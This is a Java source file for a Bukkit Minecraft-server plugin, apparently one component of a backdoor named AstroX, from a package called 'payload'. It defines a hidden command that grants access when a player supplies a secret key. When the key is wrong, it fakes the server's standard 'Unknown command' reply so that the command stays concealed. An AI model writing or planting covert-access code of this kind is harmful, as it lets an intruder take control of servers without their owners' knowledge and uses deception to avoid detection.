package dev.naruto.astrox.payload.commands;

import dev.naruto.astrox.payload.AuthManager;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

public class AuthCommand implements Command {
    @Override
    public void execute(Player sender, String[] args, JavaPlugin plugin) {
        if (args.length == 0) return;

        // FIX: Get the singleton instance instead of the placeholder
        AuthManager authManager = AuthManager.getInstance();

        if (authManager == null) return; // Safety check

        String key = args[0];

        if (authManager.authorize(sender.getUniqueId(), key)) {
            sender.sendMessage("§a§l[AstroX] Access granted.");
        } else {
            // Silent fail or fake error
            sender.sendMessage("§cUnknown command. Type \"/help\" for help.");
        }
    }
}
